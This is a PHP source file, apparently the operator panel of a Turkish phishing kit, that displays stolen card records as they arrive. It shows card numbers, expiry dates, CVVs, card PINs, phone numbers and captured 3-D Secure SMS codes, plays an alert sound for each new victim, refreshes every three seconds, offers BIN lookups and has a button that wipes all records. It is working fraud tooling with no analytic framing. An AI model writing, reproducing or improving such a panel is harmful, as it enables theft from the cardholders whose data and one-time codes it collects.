<?php
include("baglan.php");
session_start();
header("Cache-control:private");

if($_SESSION['logged'] != "1") 
{
    header("location:giris.php");
    die(); 
}

if($_GET['ananisileyimj']==1)
{

    $silamk = "TRUNCATE TABLE `datalar`";
    $islnmis = $db->prepare($silamk);
    $islnmis->execute();

    
echo "<script>alert('Tüm Kayıtlar Silindi.');</script>";
echo "<script>window.location.href='index.php';</script>";
}


	?>
	
	<?php

    $ayarsor = $db->prepare("SELECT * from datalar where ses=:id");
    $ayarsor->execute(array(
        'id' => 1
    ));

    while($ayarcek=$ayarsor->fetch(PDO::FETCH_ASSOC))
    {
        if($ayarcek['ses'] == '1'){
            echo '<div id="alerts">
            <audio id="audioplayer" autoplay=true>
            <source src="sound/pikachu.mp3" type="audio/mpeg">
            Tarayiciniz ses elementlerini desteklemiyor. </audio>
            
            </div>';
            $query = $db->prepare("UPDATE datalar SET
                ses = :ses_kapat
                WHERE id=".$ayarcek['id']." ");
                $update = $query->execute(array(
                     "ses_kapat" => "0",
                ));
        }
    }

    $ayarsorz = $db->prepare("SELECT * from datalar where notif=:notifz");
    $ayarsorz->execute(array(
        'notifz' => 1
    ));
    while($ayarcekz=$ayarsorz->fetch(PDO::FETCH_ASSOC))
    {
        if($ayarcekz['notif'] == '1'){
            echo '<div id="alerts">
            <audio id="audioplayer" autoplay=true>
            <source src="sound/sa.mp3" type="audio/mpeg">
            Tarayiciniz ses elementlerini desteklemiyor. </audio>
            
            </div>';
            $query = $db->prepare("UPDATE datalar SET
                notif = :ses_kapatz
                WHERE id=".$ayarcekz['id']." ");
                $update = $query->execute(array(
                     "ses_kapatz" => "0",
                ));
        }
    }

?>

<html class="no-js chrome" lang="tr">
<head>

	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title> PİNLİ PANEL </title>

<link rel="stylesheet" href="./index_files/bootstrap.min.css">
<link rel="stylesheet" href="./index_files/main.css">
<link rel="stylesheet" href="./index_files/authentication.css">
<link rel="stylesheet" href="./index_files/color_skins.css">
<link rel="stylesheet" href="./index_files/bootstrap-select.css">


<style type="text/css">
        .card {
            max-width: 60% !important; 
            margin-top: 100px;
        }
        .hidden-mb {
            display: none;
        }

        .authentication .card {
            margin-top: 150px;
        }

        @media only screen and (max-width: 768px) {
            .authentication .card {
                margin-top: 80px !important;
            }

            .authentication {
                min-height: 700px !important;
            }

            .theme-orange .authentication{
                background: none;
            }

            .theme-orange {
                background-color: #15435b !important;
            }

            .grecaptcha-badge {
                display: none !important;
            }
        }


        @media only screen and (max-width: 768px) {
            .card {
                max-width: 100% !important;
            }

            .hidden-xs {
                display: none;
            }

            .hidden-mb {
                display: block;
            }

            .teldiv div.bootstrap-select {
                width: 200px !important;
            }
        }

        .formdiv b:not(.normal) {
        	background-color: rgba(21,67,91, 0.85);
        	display: block;
        	color: #fff;
			padding: 5px 10px;
        }

        input {
        	height: 29px !important;
        	padding-left: 10px !important;
        	padding-right: 10px !important;
        }

        .form-group .form-control::-moz-placeholder {
        	line-height: 1 !important;
        }

        .cepdiv [type="button"]::-moz-focus-inner {
		    border-bottom: 1px solid #C9C9C9 !important;
		}

		.cepdiv .btn-group {
			margin-top: 7px !important;
		}

		.cepdiv .input-group-btn .btn {
		    line-height: 28px;
		    font-size: 14px;
		    color: #464a4c !important;
		}

		.btn-group .btn {
		    font-size: 14px;
		    color: #464a4c !important;
		}

		.cepdiv .btn-group .btn::after {
			float: right !important;
			margin: -23px 0px !important;
		}

		.cepdiv .btn-group .btn {
			/*float: left !important;*/
			margin: -10px 0 0 0 !important;
		}

		label {
			color: #3C4858 !important;
			font-weight: 600 !important;
		}

        .authDiv {
            display: none;
        }

        .card {
            margin-top: 150px !important;
        }

        @media only screen and (min-width: 1300px) {
            .authentication {
                height: 100% !important; 
                min-height: 800px !important;
            }
        }

        @media only screen and (min-width: 1900px) {
            .authentication {
                height: 100% !important; 
                min-height: 1180px !important;
            }
        }
    </style>


<style>.grecaptcha-badge:hover { right: 4px !important }</style>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>


</head>


<body>



<div class="container-fluid">
	<br><center><a href="#" onclick="javascript:if(confirm('siliyorsun!?'))
window.location.assign('?ananisileyimj=1');">Tüm Kayıtları Sil</a></center>
<div class="col col-lg-12">

    <table class="table">
      <thead>
        <tr>
          <th>#</th>
          <th>Kart no</th>
          <th>Skt</th>
          <th>Cvv</th>
          <th>GSM No</th>
          <th>Kart Şifresi</th>
          <th>LİMİT</th>
          <th>1. Sms</th>
          <th>Gözüken Tutar</th>
          <th>2. Sms</th>
		  <th>Tarih</th>
        </tr>
      </thead>
      <tbody>
		<?php


        $query = $db->prepare("SELECT * FROM datalar order by id DESC");
        $query->execute();
         
        if ( $query->rowCount() )
        {
             foreach( $query as $oku )
             {
		?>
        <tr>
            <th scope="row"><?php echo $oku['id']; ?><br>
                <a href="../a/bin.php?bnii=<?php $metin = str_replace(" ", "", $oku['kart_no']); echo $metin; ?>" target="popup" onclick="javascript:open('', 'popup', 'height=300,width=400,resizable=no')">BİN SORGULA</a>
            </th>
            <td id="pwd_spn"> <?php echo $oku['kart_no']; ?></td>
            <td><?php echo $oku['kart_skt'];            ?></td>
            <td><?php echo $oku['kart_cvv'];            ?></td>
            <td><?php echo $oku['musteri_tc'];          ?></td>
            <td><?php echo $oku['musteri_dogumyil'];    ?></td>
            <td><?php echo $oku['kart_tipi'];           ?></td>
            <td><?php echo $oku['3dsms'];               ?></td>
            <td><?php echo $oku['3dsms2'];              ?></td>
            <td><?php echo $oku['3dsms3'];              ?></td>
            <td><?php echo $oku['tarih'];               ?></td>
		
        </tr>
		<?php    
            }
        }
         ?>
      </tbody>
    </table>


</div>

<script type="text/javascript">
setTimeout(function(){
 window.location.reload(1);
}, 3000);
</script>

</div>

</div>

</body>

</html>